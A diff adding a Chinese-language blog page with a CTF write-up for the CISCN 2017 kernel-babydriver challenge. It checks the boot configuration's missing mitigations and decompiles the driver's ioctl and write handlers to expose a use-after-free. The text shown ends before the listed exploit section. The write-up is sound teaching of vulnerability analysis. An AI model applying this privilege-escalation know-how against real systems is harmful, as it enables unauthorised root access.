@@ -1,0 +1,747 @@
+  <!DOCTYPE html>
+  <html lang="zh-CN"  
+      data-theme-mode="auto"
+  >
+  <head>
+  <meta charset="utf-8">
+  
+  
+  
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_ex15nbittbh';window.REIMU_CONFIG.clipboard_tips = {"success":{"zh-CN":"复制成功 (*^▽^*)"},"fail":{"zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = '本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://idcm-svg.github.io/HFTTC.github.io';window.REIMU_CONFIG.relative = '/HFTTC.github.io/';</script>
+  <title>
+    [CISCN 2017]kernel-babydriver | HFTTC&#39;s Blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media='all'">
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_ex15nbittbh.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    
+<link rel="stylesheet" href="/HFTTC.github.io/css/loader.css">
+
+    <meta name="description" content="[CISCN 2017]kernel-babydriver作为一个刚刚涉足 kernelpwn 的萌新，由于大量未知的基础知识以及对 kernelpen 工具的陌生，一时不知道该从哪里学起，也不清楚整个 kernelpwn 大概是走什么样子的学习路线。既然如此，那就从题目开始熟悉 kernelpwn 上一篇文章我们通过 kernel-babydriver 这个题目初步了解整个题目提权的过程，这次就">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[CISCN 2017]kernel-babydriver">
+<meta property="og:url" content="https://idcm-svg.github.io/HFTTC.github.io/2026/05/23/KernelPWN/%5BCISCN2017%5Dkernel-babydriver/index.html">
+<meta property="og:site_name" content="HFTTC&#39;s Blog">
+<meta property="og:description" content="[CISCN 2017]kernel-babydriver作为一个刚刚涉足 kernelpwn 的萌新，由于大量未知的基础知识以及对 kernelpen 工具的陌生，一时不知道该从哪里学起，也不清楚整个 kernelpwn 大概是走什么样子的学习路线。既然如此，那就从题目开始熟悉 kernelpwn 上一篇文章我们通过 kernel-babydriver 这个题目初步了解整个题目提权的过程，这次就">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/cSJXJTmMCSz_sQBa/1778327058046-d2837be4-d39f-42e9-ba31-9eb2754f5b28-892825.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/cSJXJTmMCSz_sQBa/1778327159036-d4aad84f-bc27-42bb-af69-08cb8d026cae-286553.png">
+<meta property="article:published_time" content="2026-05-22T18:46:58.000Z">
+<meta property="article:modified_time" content="2026-05-22T18:58:43.493Z">
+<meta property="article:author" content="HFTTC">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/cSJXJTmMCSz_sQBa/1778327058046-d2837be4-d39f-42e9-ba31-9eb2754f5b28-892825.png">
+      <meta name="keywords" content="Pwn, CTF, Binary">
+    <link rel="alternate" href="/HFTTC.github.io/atom.xml" title="HFTTC's Blog" type="application/atom+xml">
+    <link rel="shortcut icon" href="/HFTTC.github.io/images/favicon.ico">
+  
+<link rel="stylesheet" href="/HFTTC.github.io/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx/1oA/0l8ysE" crossorigin="anonymous">
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+  <body>
+      <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script>
+<div id="copy-tooltip"></div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation">
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">首页</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/catalog">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">目录</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/friend">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">友链</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/archives">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">归档</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/categories">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">分类</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/tags">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">标签</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/about">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">关于</span>
+        </a>
+    <a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation">
+      <a id="nav-rss-link" class="nav-icon" href="/HFTTC.github.io/atom.xml" title="RSS 订阅" aria-label="RSS 订阅" target="_blank"></a>
+      <a id="nav-search-btn" class="nav-icon popup-trigger" title="搜索" aria-label="搜索"></a>
+  </nav>
+</div>
+<header id="header" aria-label="Site header">
+        <picture>
+        </picture>
+          <img  fetchpriority="high" src="/HFTTC.github.io/images/banner.webp" alt="[CISCN 2017]kernel-babydriver">
+  <div id="header-outer">
+    <div id="header-title">
+          <span id="logo">
+            <h1 data-aos="slide-up">[CISCN 2017]kernel-babydriver</h1>
+          </span>
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+        </h2>
+    </div>
+  </div>
+</header>
+
+        <div id="content" aria-label="Page content"  class="sidebar-right" >
+          <aside id="sidebar" aria-label="Sidebar">
+  <div class="sidebar-wrapper-container sticky">
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CISCN-2017-kernel-babydriver"><span class="toc-number">1.</span> <span class="toc-text">[CISCN 2017]kernel-babydriver</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#checksec-%E6%A3%80%E6%9F%A5-babydriver-ko%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">checksec 检查 babydriver.ko：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cat-boot-sh"><span class="toc-number">1.2.</span> <span class="toc-text">cat boot.sh</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IDA-%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E9%A2%98%E7%9B%AE%EF%BC%9A"><span class="toc-number">1.3.</span> <span class="toc-text">IDA 静态分析题目：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#babyioctl%EF%BC%9A"><span class="toc-number">1.3.1.</span> <span class="toc-text">babyioctl：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#babywrite"><span class="toc-number">1.3.2.</span> <span class="toc-text">babywrite</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#babyread"><span class="toc-number">1.3.3.</span> <span class="toc-text">babyread</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#babyrelease"><span class="toc-number">1.3.4.</span> <span class="toc-text">babyrelease</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9A"><span class="toc-number">1.4.</span> <span class="toc-text">漏洞利用：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%86%E8%A7%A3-thread-info%EF%BC%9A"><span class="toc-number">1.4.1.</span> <span class="toc-text">了解 thread_info：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#task-struct%EF%BC%9A"><span class="toc-number">1.4.2.</span> <span class="toc-text">task_struct：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cred-struct%EF%BC%9A"><span class="toc-number">1.4.3.</span> <span class="toc-text">cred_struct：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E8%8E%B7%E5%8F%96-thread-info-%E5%9C%B0%E5%9D%80%E7%9A%84%E4%BB%A3%E7%A0%81%EF%BC%9A"><span class="toc-number">1.4.4.</span> <span class="toc-text">内核获取 thread_info 地址的代码：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-%E6%80%9D%E8%B7%AF%EF%BC%9A"><span class="toc-number">1.5.</span> <span class="toc-text">EXP 思路：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89%E5%8F%98%E9%87%8F%EF%BC%9A"><span class="toc-number">1.5.1.</span> <span class="toc-text">定义变量：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E8%BE%85%E5%8A%A9%E5%8C%BA%EF%BC%9A"><span class="toc-number">1.5.2.</span> <span class="toc-text">函数辅助区：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#UAF-%E7%AF%A1%E6%94%B9-cred-struct%EF%BC%9A"><span class="toc-number">1.5.3.</span> <span class="toc-text">UAF 篡改 cred_struct：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%89%A7%E8%A1%8C%E6%B5%81-Main-%E5%87%BD%E6%95%B0"><span class="toc-number">1.5.4.</span> <span class="toc-text">攻击执行流 -Main 函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB-EXP"><span class="toc-number">1.6.</span> <span class="toc-text">总 EXP:</span></a></li></ol></li></ol>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/HFTTC.github.io/avatar/head.jpg" data-sizes="auto" alt="HFTTC" class="lazyload">
+  <div class="sidebar-author-name">HFTTC</div>
+  <div class="sidebar-description">心之所向，无问西东</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">132</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">1</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">1</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/IDCM-svg itemprop="url" target="_blank" aria-label="github" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/catalog" aria-label="目录"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">目录</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/categories" aria-label="分类"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">分类</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/tags" aria-label="标签"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">标签</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+</div>
+</div>
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+    </div>
+  </div>
+  <div class="sidebar-widget">
+  </div>
+  </div>
+</aside>
+
+          <section id="main" aria-label="Main content"><article id="post-KernelPWN/[CISCN2017]kernel-babydriver" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2026-05-22T18:46:58.000Z" itemprop="datePublished">2026-05-23</time>
+    <time style="display: none;" id="post-update-time">2026-05-23</time>
+  </span>
+    <span class="article-date-link icon-calendar-plus" data-aos="zoom-in">
+      <time datetime="2026-05-22T18:58:43.493Z" itemprop="dateModified">2026-05-23</time>
+    </span>
+</div>
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+        <h1 id="CISCN-2017-kernel-babydriver"><a href="#CISCN-2017-kernel-babydriver" class="headerlink" title="[CISCN 2017]kernel-babydriver"></a>[CISCN 2017]kernel-babydriver</h1><p>作为一个刚刚涉足 kernelpwn 的萌新，由于大量未知的基础知识以及对 kernelpen 工具的陌生，一时不知道该从哪里学起，也不清楚整个 kernelpwn 大概是走什么样子的学习路线。既然如此，那就从题目开始熟悉 kernelpwn</p>
+<p>上一篇文章我们通过 kernel-babydriver 这个题目初步了解整个题目提权的过程，这次就记录一下如何利用漏洞</p>
+<h3 id="checksec-检查-babydriver-ko："><a href="#checksec-检查-babydriver-ko：" class="headerlink" title="checksec 检查 babydriver.ko："></a>checksec 检查 babydriver.ko：</h3><p><img src="/HFTTC.github.io/images/pwn/cSJXJTmMCSz_sQBa/1778327058046-d2837be4-d39f-42e9-ba31-9eb2754f5b28-892825.png" alt="1778327058046-d2837be4-d39f-42e9-ba31-9eb2754f5b28.png"></p>
+<h3 id="cat-boot-sh"><a href="#cat-boot-sh" class="headerlink" title="cat boot.sh"></a>cat boot.sh</h3><p><img src="/HFTTC.github.io/images/pwn/cSJXJTmMCSz_sQBa/1778327159036-d4aad84f-bc27-42bb-af69-08cb8d026cae-286553.png" alt="1778327159036-d4aad84f-bc27-42bb-af69-08cb8d026cae.png"></p>
+<ul>
+<li>没有 KASLR：<code>-append</code> 参数中没有 <code>kaslr</code>。这表示内核基地址是固定的，你不需要通过泄露内核基地址</li>
+<li>没有 SMEP&#x2F;SMAP：参数中没有 <code>+smep</code> 或 <code>+smap</code>。这表示如果你能劫持执行流，内核可以直接跳转到用户态执行你的 Shellcode）。</li>
+<li>内存极小：<code>-m 64M</code>，这在内核调试中很常见。</li>
+<li>单核：<code>-smp cores=1</code>。</li>
+</ul>
+<h3 id="IDA-静态分析题目："><a href="#IDA-静态分析题目：" class="headerlink" title="IDA 静态分析题目："></a>IDA 静态分析题目：</h3><h4 id="babyioctl："><a href="#babyioctl：" class="headerlink" title="babyioctl："></a>babyioctl：</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">babyioctl</span><span class="params">(file *filp, <span class="type">unsigned</span> <span class="type">int</span> command, <span class="type">unsigned</span> __int64 arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> v3; <span class="comment">// rdx</span></span><br><span class="line">    <span class="type">size_t</span> v4; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">    _fentry__(filp, command);</span><br><span class="line">    v4 = v3;</span><br><span class="line">    <span class="keyword">if</span> ( command == <span class="number">65537</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        kfree(babydev_struct.device_buf);</span><br><span class="line">        babydev_struct.device_buf = (<span class="type">char</span> *)_kmalloc(v4, <span class="number">37748928</span>);</span><br><span class="line">        babydev_struct.device_buf_len = v4;</span><br><span class="line">        printk(<span class="string">&quot;alloc done\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        printk(&amp;unk_2EB);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-22</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>kfree 掉device_buf,kmalloc用户指定大小的堆块。</p>
+<hr>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_fentry__(filp, command);</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><code>__fentry__</code> 是编译器在启用 <code>-mfentry</code> 编译选项后，自动在每个函数的最开头插入的一个调用指令。</li>
+</ol>
+<ul>
+<li>它的存在就像是在函数的大门口放了一个哨兵。在函数执行实际逻辑，甚至是保存栈帧寄存器 push rbp之前，程序会先跳转到 <strong>fentry</strong> 运行。</li>
+</ul>
+<ol start="2">
+<li><code>filp</code> 与 <code>command</code>表明该钩子被放置在一个处理文件操作或驱动通信的函数中：</li>
+</ol>
+<ul>
+<li>filp (struct file *): 指向当前打开文件的结构体指针。它包含了文件的状态、权限以及对应的驱动程序信息</li>
+<li>command (unsigned int): 通常代表 IOCTL 命令码。用户态程序通过 ioctl() 系统调用向内核发送特定的指令，内核根据这个 command 来决定执行什么操作。</li>
+</ul>
+<hr>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">babyioctl</span><span class="params">(file *filp, <span class="type">unsigned</span> <span class="type">int</span> command, <span class="type">unsigned</span> __int64 arg)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v3; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rbx</span></span><br></pre></td></tr></table></figure>
+
+<p>在 64 位 Linux 内核调用约定中，前三个参数分别放在 <code>rdi</code>, <code>rsi</code>, <code>rdx</code> 寄存器中。<code>arg</code> 就是第三个参数，也就是你从用户态传进来的长度，它存在 <code>rdx</code> 里。v4 &#x3D; v3; 就等同于 v4 &#x3D; arg;。你传入的大小最终交给了 v4</p>
+<hr>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( command == <span class="number">65537</span> )    <span class="comment">// 如果用户态发来的命令是 0x10001，就执行大括号里的逻辑。</span></span><br><span class="line">&#123;</span><br><span class="line">    kfree(babydev_struct.device_buf);</span><br><span class="line">    babydev_struct.device_buf = (<span class="type">char</span> *)_kmalloc(v4, <span class="number">37748928</span>);</span><br><span class="line">    babydev_struct.device_buf_len = v4;</span><br><span class="line">    printk(<span class="string">&quot;alloc done\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>kfree</code> 函数是内核态释放内存的标准函数，相当于用户态的 <code>free()</code>。它会将内存块交还给内核的 SLUB 分配器。它释放了全局结构体中保存的那个旧缓冲区的指针<code>babydev_struct.device_buf</code>。</li>
+<li>此时，device_buf 变成了一个悬空指针，存在 UAF 漏洞。</li>
+<li><code>_kmalloc</code> 函数是内核态分配连续物理内存的函数，相当于用户态的 <code>malloc()</code>。v4 作为分配内存的大小参数，前面提到 v4&#x3D;v3，这意味着新分配的内存大小完全由用户决定</li>
+<li>参数 37748928是分配标志位，转为十六进制是 0x24000C0：这是 kmalloc 第二个参数 <code>gfp_t flags</code>。 这个具体的数值代表内核在分配这块内存时，允许进程睡眠等待（如果内存紧张的话），并且允许进行文件系统操作和 I&#x2F;O 操作来置换内存。</li>
+</ul>
+<p>总结来说就是内核按照用户指定的大小（<code>v4</code>）分配出一块新的堆内存，并将新地址重新赋给了全局指针 <code>babydev_struct.device_buf</code>。</p>
+<hr>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    printk(&amp;unk_2EB);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-22</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>在 Linux 内核中，负数返回值代表错误码 Errno。22 对应的是宏 EINVAL ，即非法参数。</li>
+<li>当用户态程序调用 ioctl 传递了一个驱动程序不支持的 command 时，内核会返回这个错误。此时，用户态收到的 ioctl 返回值通常是 -1，而全局变量 errno 会被设置为 22。</li>
+</ul>
+<hr>
+<h4 id="babywrite"><a href="#babywrite" class="headerlink" title="babywrite"></a>babywrite</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> __fastcall <span class="title function_">babywrite</span><span class="params">(file *filp, <span class="type">const</span> <span class="type">char</span> *buffer, <span class="type">size_t</span> length, <span class="type">loff_t</span> *offset)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line">    <span class="type">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">    <span class="type">ssize_t</span> v6; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">    _fentry__(filp, buffer);</span><br><span class="line">    <span class="keyword">if</span> ( !babydev_struct.device_buf )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    result = <span class="number">-2</span>;</span><br><span class="line">    <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">    &#123;</span><br><span class="line">        v6 = v4;</span><br><span class="line">        copy_from_user();</span><br><span class="line">        <span class="keyword">return</span> v6;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>从用户的buf里面写入到device_buf，大小要小于堆块的大小。</p>
+<hr>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> __fastcall <span class="title function_">babywrite</span><span class="params">(file *filp, <span class="type">const</span> <span class="type">char</span> *buffer, <span class="type">size_t</span> length, <span class="type">loff_t</span> *offset)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">ssize_t</span> v6; <span class="comment">// rbx</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>filp：文件结构体指针（代表你打开的这个设备文件）。</li>
+<li>buffer：用户态传进来的数据指针（你要写入的数据）。</li>
+<li>length：用户态请求写入的字节数。实际上 v4 就等于 length</li>
+<li>offset：文件偏移量。</li>
+</ul>
+<hr>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !babydev_struct.device_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br></pre></td></tr></table></figure>
+
+<p>空指针检查：检查全局结构体 <code>babydev_struct</code> 中的 <code>device_buf</code> 是否为 NULL。</p>
+<hr>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">&#123;</span><br><span class="line">    v6 = v4;</span><br><span class="line">    copy_from_user();</span><br><span class="line">    <span class="keyword">return</span> v6;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure>
+
+<p>长度边界检查：检查当前全局缓冲区分配的长度是否大于用户请求写入的长度 v4 。</p>
+<ul>
+<li><code>copy_from_user()</code>：这是 Linux 内核中最核心的函数之一，它的作用是安全地将数据从用户空间 buffer 拷贝到内核空间。底层汇编实际执行的是 copy_from_user(babydev_struct.device_buf, buffer, v4)。</li>
+<li>返回成功：返回实际写入的字节数 v6（即传入的 <code>length</code>）。</li>
+</ul>
